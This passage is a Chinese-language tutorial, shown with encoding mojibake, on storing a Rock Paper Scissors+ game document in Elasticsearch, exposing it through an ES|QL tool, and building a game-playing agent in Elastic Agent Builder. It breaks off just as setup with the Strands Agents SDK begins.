<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1530465ae69d4ee4a9784d33e52210af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=RwR%2Bs6C9NGyi0URBRUmxFqoSXJM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">åˆ›å»ºç´¢å¼•å¹¶æ·»åŠ æ•°æ®</h2>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åœ¨ Elasticsearch é¡¹ç›®ä¸­æ·»åŠ ä¸€äº›æ•°æ®ã€‚æ‰“å¼€ Developer Toolsï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿è¡Œå‘½ä»¤æ¥åˆ›å»ºæ–°ç´¢å¼•å¹¶å‘å…¶ä¸­æ’å…¥æ•°æ®ã€‚ä»é¡¶å±‚å¯¼èˆªèœå•ä¸­é€‰æ‹© Developer Toolsã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1619ab5733c240c5a046f100c616529d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=uiyBCyZgLL%2FNDEP9WyABgvWY1Ko%3D" alt="" loading="lazy"/></p>
<p>å°†ä»¥ä¸‹ PUT å‘½ä»¤å¤åˆ¶å¹¶ç²˜è´´åˆ° Developer Tools æ§åˆ¶å°çš„è¯·æ±‚è¾“å…¥åŒºåŸŸã€‚æ­¤è¯­å¥ä¼šåˆ›å»ºä¸€ä¸ªåä¸º â€œgame-docsâ€ çš„ Elasticsearch ç´¢å¼•ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT /game-docs
2.  {
3.    <span class="hljs-string">"mappings"</span>: {
4.      <span class="hljs-string">"properties"</span>: {
5.        <span class="hljs-string">"title"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span> },
6.        <span class="hljs-string">"content"</span>: { 
7.          <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span>
8.        },
9.        <span class="hljs-string">"filename"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"keyword"</span> },
10.        <span class="hljs-string">"last_modified"</span>: { <span class="hljs-string">"type"</span>: <span class="hljs-string">"date"</span> }
11.      }
12.    }
13.  }

`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>ç‚¹å‡» Developer Tools ä¸­è¯­å¥å³ä¾§å‡ºç°çš„ Send request æŒ‰é’®ã€‚ä½ åº”è¯¥ä¼šåœ¨ Developer Tools çš„å“åº”åŒºåŸŸçœ‹åˆ°ä¸€æ¡é€šçŸ¥ï¼Œç¡®è®¤ game-docs ç´¢å¼•å·²åˆ›å»ºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92502a7d1e9f450483a7ade805b5a39b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=3JWYVZOuzX0Q%2FD4g8RjHkk2d6jw%3D" alt="" loading="lazy"/></p>
<p>åä¸º game-docs çš„ç´¢å¼•æ˜¯å­˜å‚¨æˆ‘ä»¬æ­£åœ¨åˆ¶ä½œçš„æ¸¸æˆæ•°æ®çš„ç†æƒ³ä½ç½®ã€‚è®©æˆ‘ä»¬åœ¨è¯¥ç´¢å¼•ä¸­æ”¾å…¥ä¸€ä¸ªåä¸º rps+-md çš„æ–‡æ¡£ï¼Œå…¶ä¸­åŒ…å«æ¸¸æˆæ‰€éœ€çš„æ‰€æœ‰æ•°æ®ã€‚å°†ä»¥ä¸‹ PUT å‘½ä»¤å¤åˆ¶å¹¶ç²˜è´´åˆ° Developer Tools æ§åˆ¶å°ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">`

1.  PUT /game-docs/_doc/rps+-md
2.  {
3.    <span class="hljs-string">"title"</span>: <span class="hljs-string">"Rock Paper Scissors +"</span>,
4.    <span class="hljs-string">"content"</span>: <span class="hljs-string">"
5.  # Game Name
6.  RPS+

8.  # Starting Prompt
9.  Let's play RPS+ !
10.  ---
11.  What do you choose?

13.  # Game Objects
14.  1. Rock ğŸª¨ ğŸ‘Š
15.  2. Paper ğŸ“œ ğŸ–
16.  3. Scissors âœ„ âœŒï¸
17.  4. Light â˜¼ ğŸ‘
18.  5. Dark Energy â˜„ ğŸ«±

20.  # Judgement of Victory
21.  * Rock beats Scissors
22.    * because rocks break scissors
23.  * Paper beats Rock
24.    * because paper covers rock
25.  * Scissors beat Paper
26.    * because scissors cut paper
27.  * Rock beats Light
28.    * because you can build a rock structure to block out light
29.  * Paper beats Light
30.    * because knowledge stored in files and paper books helps us understand light
31.  * Light beats Dark Energy
32.    * because light enables humans to lighten up and laugh in the face of dark energy as it causes the eventual heat death of the universe
33.  * Light beats Scissors
34.    * because light is needed to use scissors safely
35.  * Dark Energy beats Rock
36.    * because dark energy rocks more than rocks. It rocks rocks and everything else in its expansion of the universe
37.  * Dark Energy beats Paper
38.    * because humans, with their knowledge stored in files and paper books, can't explain dark energy 
39.  * Scissors beat Dark Energy
40.    * because a human running with scissors is darker than dark energy

42.  # Invalid Input
43.  I was hoping for an worthy opponent
44.    - but alas it appears that time has past
45.    - but alas there's little time for your todo list when [todo:fix this] is so vast

47.  # Cancel Game
48.  The future belongs to the bold. Goodbye..
49.  "</span>,
50.    <span class="hljs-string">"filename"</span>: <span class="hljs-string">"RPS+.md"</span>,
51.    <span class="hljs-string">"last_modified"</span>: <span class="hljs-string">"2025-11-25T12:00:00Z"</span>
52.  }

`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)æ”¶èµ·ä»£ç å—![](https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-top-White.png)
</code></pre>
<p>ç‚¹å‡»è¯­å¥æ—çš„ <strong>Send request</strong> æŒ‰é’®è¿è¡Œå®ƒï¼Œå°† rps+-md æ–‡æ¡£æ·»åŠ åˆ° game-docs ç´¢å¼•ä¸­ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/239a57e3648f42c18be567212452e945~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=GPF45u2ALQpgLsR4mPT4khqxZZU%3D" alt="" loading="lazy"/></p>
<p>ç°åœ¨æˆ‘ä»¬åº”è¯¥æœ‰ä¸€äº›å¯ä»¥æŸ¥è¯¢çš„æ•°æ®äº†ï¼Œä½¿ç”¨ Agent Builderï¼Œè¿™æ¯”ä»¥å¾€æ›´ç®€å•ã€‚</p>
<p>ä»é¡¶å±‚å¯¼èˆªèœå•ä¸­é€‰æ‹© <strong>Agents</strong>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c751d7cb5d8472e9fcf83ac00a9c416~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=xWh8itjql%2BcfCCiKfLQ3I4OuC6U%3D" alt="" loading="lazy"/></p>
<p>ç„¶åä½ åªéœ€é—®é»˜è®¤çš„ Elastic AI Agentï¼šâ€œæˆ‘æœ‰ä»€ä¹ˆæ•°æ®ï¼Ÿâ€</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff6f67aab5004cba90d63cdc52a0c314~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=3Ekzda%2FVZOa6%2BSeBBg64Wcd7hwQ%3D" alt="" loading="lazy"/></p>
<p>Elastic AI Agent ä¼šè¯„ä¼°æ•°æ®å¹¶è¿”å›æˆ‘ä»¬æ‹¥æœ‰çš„æ•°æ®çš„ç®€æ˜è¯´æ˜ã€‚</p>
<h2 data-id="heading-3">åˆ›å»ºå·¥å…·</h2>
<p>å¥½äº†ï¼Œæˆ‘ä»¬ç°åœ¨åœ¨ Elastic ä¸­å·²æœ‰ä¸€äº›æ•°æ®ï¼Œè®©æˆ‘ä»¬å¼€å§‹ä½¿ç”¨å®ƒã€‚Agent Builder å†…ç½®æ”¯æŒåˆ›å»º <a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" title="https://modelcontextprotocol.io/" target="_blank" ref="nofollow noopener noreferrer">MCP</a> å·¥å…·ï¼Œå¸®åŠ© agent è®¿é—®æ‰€éœ€æ•°æ®ï¼Œä»è€Œè·å¾—ä»»åŠ¡çš„æ­£ç¡®ä¸Šä¸‹æ–‡ã€‚è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®€å•çš„å·¥å…·æ¥æ£€ç´¢æˆ‘ä»¬çš„æ¸¸æˆæ•°æ®ã€‚</p>
<p>ç‚¹å‡» Agent Builder çš„ actions èœå•ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/830e19bd82774d9692ec0bf090535c78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=Up5Zavq2YWGzMnBlQrU2%2Bbe5Oys%3D" alt="" loading="lazy"/></p>
<p>ä»èœå•é€‰é¡¹ä¸­é€‰æ‹© View all toolsã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8fbf09048bc4bb4a07ed58cd84ac333~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=la8xAVDmQE4GLk4ENTuk%2FlFMQAM%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡» + New Toolã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b67c51ec4e734d9eb21a87c65c0fd1b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=ApI8o7d8PcOSyUeOyvEav0tg%2F5c%3D" alt="" loading="lazy"/></p>
<p>åœ¨ Create Tool è¡¨å•ä¸­ï¼Œé€‰æ‹© <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fquery-filter%2Flanguages%2Fesql" title="https://www.elastic.co/docs/explore-analyze/query-filter/languages/esql" target="_blank" ref="nofollow noopener noreferrer">ES|QL</a> ä½œä¸ºå·¥å…· typeï¼Œå¹¶è¾“å…¥ä»¥ä¸‹å€¼ã€‚</p>
<p><strong>Tool ID</strong>ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`example.get_game_docs`</span>AIå†™ä»£ç 
</code></pre>
<p><strong>Description</strong>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`<span class="hljs-keyword">Get</span> RPS<span class="hljs-operator">+</span> doc <span class="hljs-keyword">from</span> Elasticsearch game<span class="hljs-operator">-</span>docs index.`AIå†™ä»£ç 
</code></pre>
<p><strong>Configuration</strong>ï¼šåœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fquery-filter%2Flanguages%2Fesql" title="https://www.elastic.co/docs/explore-analyze/query-filter/languages/esql" target="_blank" ref="nofollow noopener noreferrer">ES|QL</a> Query æ–‡æœ¬åŒºåŸŸä¸­è¾“å…¥ä»¥ä¸‹æŸ¥è¯¢ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">`FROM game-docs | WHERE <span class="hljs-attr">filename</span> == <span class="hljs-string">"RPS+.md"</span>`AIå†™ä»£ç 
</code></pre>
<p>å®Œæ•´å¡«å†™çš„ Create tool è¡¨å•åº”å¦‚ä¸‹æ‰€ç¤ºã€‚ç‚¹å‡» Save åˆ›å»ºå·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bdc0ab4e55f414a8f4459423f2bfeb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=AJiVBJuY3l52CrRx%2BXm5UTO7PWs%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬åœ¨å·¥å…·æ¶ä¸Šæœ‰äº†ä¸€ä¸ªæ–°å·¥å…·ã€‚å·¥å…·ä¸åº”è¯¥åªæ˜¯ä¸€ç›´æŒ‚åœ¨æ¶å­ä¸Šï¼Œå®ƒä»¬åº”è¯¥è¢«å……åˆ†åˆ©ç”¨ã€‚è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¯ä»¥ä½¿ç”¨æˆ‘ä»¬æ–°è‡ªå®šä¹‰å·¥å…·çš„ agentã€‚</p>
<h2 data-id="heading-4">åˆ›å»º Agent å¹¶åˆ†é…å·¥å…·</h2>
<p>ä½¿ç”¨ Agent Builder åˆ›å»º agent éå¸¸ç®€å•ã€‚ä½ åªéœ€è¾“å…¥ agent æŒ‡ä»¤å’Œä¸€äº›ç»†èŠ‚ï¼Œå°±å®Œæˆäº†ã€‚ç°åœ¨è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª agentã€‚</p>
<p>ç‚¹å‡» Manage agentsã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b66c564303ec4c90ac022183b97ac0aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=ZCL4HhXTS%2F%2B3Ynzesm%2BeYY1mYbY%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡» + New agentã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca458ff4c5be4ec5855f184dd718dc73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=4iJpFWQhQP4xUCfpiIYP2C9xRhE%3D" alt="" loading="lazy"/></p>
<p>åœ¨ New Agent è¡¨å•ä¸­è¾“å…¥ä»¥ä¸‹ä¿¡æ¯ã€‚</p>
<p>Agent IDï¼šè¾“å…¥ä»¥ä¸‹æ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`rps_plus_agent`</span>AIå†™ä»£ç 
</code></pre>
<p>åœ¨ Custom Instructions æ–‡æœ¬åŒºåŸŸä¸­è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">`

<span class="hljs-number">1</span>.  <span class="hljs-keyword">When</span> prompted, <span class="hljs-keyword">if</span> the prompt contains an <span class="hljs-type">integer</span>, <span class="hljs-keyword">then</span> <span class="hljs-keyword">select</span> the corresponding numbered item <span class="hljs-keyword">in</span> the list <span class="hljs-keyword">of</span> <span class="hljs-string">"Game Objects"</span> <span class="hljs-keyword">from</span> your documents. Otherwise <span class="hljs-keyword">select</span> a random game <span class="hljs-type">object</span>. This <span class="hljs-built_in">is</span> your chosen game <span class="hljs-type">object</span> <span class="hljs-keyword">for</span> a <span class="hljs-type">single</span> round <span class="hljs-keyword">of</span> the game.

<span class="hljs-number">3</span>.  # General Game Rules
<span class="hljs-number">4</span>.  * <span class="hljs-number">2</span> players
<span class="hljs-number">5</span>.      - the user: the person playing the game
<span class="hljs-number">6</span>.      - you: the agent playing the game <span class="hljs-built_in">and</span> serving <span class="hljs-keyword">as</span> the game master
<span class="hljs-number">7</span>.  * <span class="hljs-keyword">Each</span> player chooses a game <span class="hljs-type">object</span> which will be compared <span class="hljs-built_in">and</span> cause them <span class="hljs-keyword">to</span> tie, win <span class="hljs-built_in">or</span> lose.

<span class="hljs-number">9</span>.  # Start the game
<span class="hljs-number">10</span>.  <span class="hljs-number">1</span>. This <span class="hljs-built_in">is</span> the way <span class="hljs-keyword">each</span> <span class="hljs-built_in">new</span> game always starts. You make the first line <span class="hljs-keyword">of</span> your response only the name <span class="hljs-keyword">of</span> your chosen game <span class="hljs-type">object</span>. 

<span class="hljs-number">12</span>.  <span class="hljs-number">2</span>. The remainder <span class="hljs-keyword">of</span> your response should be the <span class="hljs-string">"Starting Prompt"</span> <span class="hljs-keyword">text</span> <span class="hljs-keyword">from</span> your documents <span class="hljs-built_in">and</span> generate a list <span class="hljs-keyword">of</span> <span class="hljs-string">"Game Objects"</span> <span class="hljs-keyword">for</span> the person playing the game <span class="hljs-keyword">to</span> choose a game <span class="hljs-type">object</span> <span class="hljs-keyword">from</span>.  

<span class="hljs-number">14</span>.  # <span class="hljs-keyword">End</span> <span class="hljs-keyword">of</span> Game: The game ends <span class="hljs-keyword">in</span> one <span class="hljs-keyword">of</span> the following three outcomes:
<span class="hljs-number">15</span>.  <span class="hljs-number">1</span>. Invalid Input: <span class="hljs-keyword">If</span> the player responds <span class="hljs-keyword">with</span> an invalid game <span class="hljs-type">object</span> choice, respond <span class="hljs-keyword">with</span> variations <span class="hljs-keyword">of</span> the <span class="hljs-string">"Invalid Input"</span> <span class="hljs-keyword">text</span> <span class="hljs-keyword">from</span> your documents <span class="hljs-built_in">and</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">end</span> the game.

<span class="hljs-number">17</span>.  <span class="hljs-number">2</span>. Tie: The game ends <span class="hljs-keyword">in</span> a tie <span class="hljs-keyword">if</span> the user chooses the same game <span class="hljs-type">object</span> <span class="hljs-keyword">as</span> your game <span class="hljs-type">object</span> choice.

<span class="hljs-number">19</span>.  <span class="hljs-number">3</span>. Win <span class="hljs-built_in">or</span> Lose: The game winner <span class="hljs-built_in">is</span> decided based <span class="hljs-keyword">on</span> the <span class="hljs-string">"Judgement of Victory"</span> conditions <span class="hljs-keyword">from</span> your documents. <span class="hljs-keyword">Compare</span> the user<span class="hljs-comment">'s game object choice and your game object choice and determine who chose the winning game object.</span>

<span class="hljs-number">21</span>.  # Game conclusion
<span class="hljs-number">22</span>.  Respond <span class="hljs-keyword">with</span> a declaration <span class="hljs-keyword">of</span> the winner <span class="hljs-keyword">of</span> the game <span class="hljs-keyword">by</span> outputting the corresponding <span class="hljs-keyword">text</span> <span class="hljs-keyword">in</span> the <span class="hljs-string">"Judgement of Victory"</span> section <span class="hljs-keyword">of</span> your documents.

`AIå†™ä»£ç ![](https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p><strong>Display name</strong>ï¼šè¾“å…¥ä»¥ä¸‹æ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`RPS+ Agent`</span>AIå†™ä»£ç 
</code></pre>
<p><strong>Display description</strong>ï¼šè¾“å…¥ä»¥ä¸‹æ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`An agent that plays the game RPS+`</span>AIå†™ä»£ç 
</code></pre>
<p>é€šè¿‡ç‚¹å‡» Tools é€‰é¡¹å¡ï¼Œå°†æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„è‡ªå®šä¹‰å·¥å…·åˆ†é…ç»™è¯¥ agentã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b994b761ccf452192124e850fbf4b2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=028ZK%2Bhg4VEo1D0EljqddZA6heM%3D" alt="" loading="lazy"/></p>
<p>åªé€‰æ‹©æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„ example.get_game_docs å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b047ee445e5455e98e470fd1b3a3713~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=jlZK37C9rrz0M8NulOUlXQ5Z%2BfQ%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡» Save åˆ›å»ºæ–° agentã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55aec75b2d4e46d09541774bf5be8036~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=Bmu8QmOHChvYW%2BrnhPGio6h1o90%3D" alt="" loading="lazy"/></p>
<p>è®©æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹æ–° agentã€‚ä» agent åˆ—è¡¨ä¸­æœ‰ä¸€ä¸ªæ–¹ä¾¿çš„é“¾æ¥ï¼Œå¯ä»¥å¯åŠ¨ä¸ä»»æ„ agent çš„èŠå¤©ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33d63324613a469485624979018c6919~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=R435zc%2BKmfG8qiucWOacWe5qdq4%3D" alt="" loading="lazy"/></p>
<p>åªéœ€è¾“å…¥ â€œstart gameâ€ï¼Œæ¸¸æˆå°±ä¼šå¼€å§‹ã€‚å®ƒå¯ä»¥æ­£å¸¸è¿è¡Œï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9105918d1fc04d0d8e23f5d34fb69ae4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=Ikx9Ud8zwJf3y9RrIdL5y8RvtJc%3D" alt="" loading="lazy"/></p>
<p>ä½ å¯ä»¥çœ‹åˆ° agent åœ¨å“åº”é¡¶éƒ¨æ˜¾ç¤ºäº†å®ƒé€‰æ‹©çš„æ¸¸æˆå¯¹è±¡ã€‚è¿™å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ° agent çš„é€‰æ‹©å¹¶ç¡®è®¤æ¸¸æˆæŒ‰é¢„æœŸè¿è¡Œã€‚ç„¶è€Œï¼Œåœ¨ä½ é€‰æ‹©ä¹‹å‰çŸ¥é“å¯¹æ‰‹çš„é€‰æ‹©ï¼Œä¼šè®©å‰ªåˆ€çŸ³å¤´å¸ƒæ¸¸æˆä¸å¤ªæœ‰è¶£ã€‚ä¸ºäº†å°†æ¸¸æˆæ‰“ç£¨åˆ°æœ€ç»ˆå½¢æ€ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå¯ä»¥é€šè¿‡ä»£ç æ§åˆ¶ agent çš„ agent ç¼–æ’å¹³å°ã€‚</p>
<p>Strands Agents SDK ç™»åœº</p>
<h2 data-id="heading-5">Strands Agents SDK</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a83bc22e84a74c7f81d5bb40e02f0e34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=n2%2F0E8qcpHiGhe63GtrbH2mZOqc%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ æƒ³å°è¯•æ–°çš„ agent å¼€å‘æ¡†æ¶ï¼Œé‚£ä¹ˆ <a href="https://link.juejin.cn?target=https%3A%2F%2Fstrandsagents.com%2Flatest%2F" title="https://strandsagents.com/latest/" target="_blank" ref="nofollow noopener noreferrer">Strands Agents SDK</a> å€¼å¾—ä½ èŠ±æ—¶é—´å°è¯•ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fblogs%2Fopensource%2Fintroducing-strands-agents-an-open-source-ai-agents-sdk%2F" title="https://aws.amazon.com/blogs/opensource/introducing-strands-agents-an-open-source-ai-agents-sdk/" target="_blank" ref="nofollow noopener noreferrer">Strands Agents SDK ç”± AWS äº 2025 å¹´ 5 æœˆå‘å¸ƒ</a>ï¼Œä½œä¸ºå¼€æº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fstrands-agents%2Fsdk-python" title="https://github.com/strands-agents/sdk-python" target="_blank" ref="nofollow noopener noreferrer">Python</a> å®ç°ï¼Œç°åœ¨ä¹Ÿæœ‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.to%2Faws%2Fstrands-agents-now-speaks-typescript-a-side-by-side-guide-12b3" title="https://dev.to/aws/strands-agents-now-speaks-typescript-a-side-by-side-guide-12b3" target="_blank" ref="nofollow noopener noreferrer">Typescript</a> ç‰ˆæœ¬ã€‚</p>
<h2 data-id="heading-6">åœ¨ Python ä¸­å¿«é€Ÿä¸Šæ‰‹ Strands Agents SDK</h2>
<p>å¯åŠ¨ä½ çš„ç¼–ç ç¯å¢ƒï¼Œæˆ‘ä»¬ç°åœ¨å°†å¿«é€Ÿæµè§ˆå…‹éš†å¹¶è¿è¡Œä¸€ä¸ªç¤ºä¾‹åº”ç”¨çš„è¿‡ç¨‹ï¼Œè¯¥åº”ç”¨ä½¿ç”¨ Strands Agents é€šè¿‡ A2A åè®®æ§åˆ¶ RPS+ Agentã€‚è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç»è¿‡å¾®è°ƒçš„ RPS+ æ¸¸æˆç‰ˆæœ¬ï¼Œä½¿ agent çš„é€‰æ‹©åœ¨ä½ åšå‡ºé€‰æ‹©åæ‰æ˜¾ç¤ºï¼Œå› ä¸ºæ¯•ç«Ÿï¼ŒçŒœæµ‹å’ŒæƒŠå–œç»“æœæ‰æ˜¯å‰ªåˆ€çŸ³å¤´å¸ƒç­‰æ¸¸æˆçš„ä¹è¶£æ‰€åœ¨ã€‚</p>
<p>åœ¨ä½ çš„æœ¬åœ°ç”µè„‘ä¸Šï¼Œæ‰“å¼€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.visualstudio.com%2Fdownload" title="https://code.visualstudio.com/download" target="_blank" ref="nofollow noopener noreferrer">Visual Studio Code</a> å¹¶æ‰“å¼€ä¸€ä¸ªæ–°ç»ˆç«¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79ab8a70786f42fb97dedee60a67951d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457388&amp;x-signature=h1ySAB%2FussJwVLjF9XrNrZkYfUM%3D" alt="" loading="lazy"/></p>
<p>åœ¨æ–°æ‰“å¼€çš„ç»ˆç«¯ä¸­ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤å…‹éš† Elasticsearch Labs ä»“åº“ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`git <span class="hljs-built_in">clone</span> https://github.com/elastic/elasticsearch-labs`AIå†™ä»£ç 
</code></pre>
<p>è¿è¡Œä»¥ä¸‹ cd å‘½ä»¤ï¼Œå°†ç›®å½•åˆ‡æ¢åˆ° elasticsearch-labs ç›®å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">`<span class="hljs-built_in">cd</span> elasticsearch-labs`AIå†™ä»£ç 
</code></pre>
<p>æ¥ä¸‹æ¥ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤åœ¨ Visual Studio Code ä¸­æ‰“å¼€è¯¥ä»“åº“ï¼š</p>
<pre><code class="hljs language-css" lang="css">`<span class="hljs-selector-tag">code</span> .`AIå†™ä»£ç 
</code></pre>
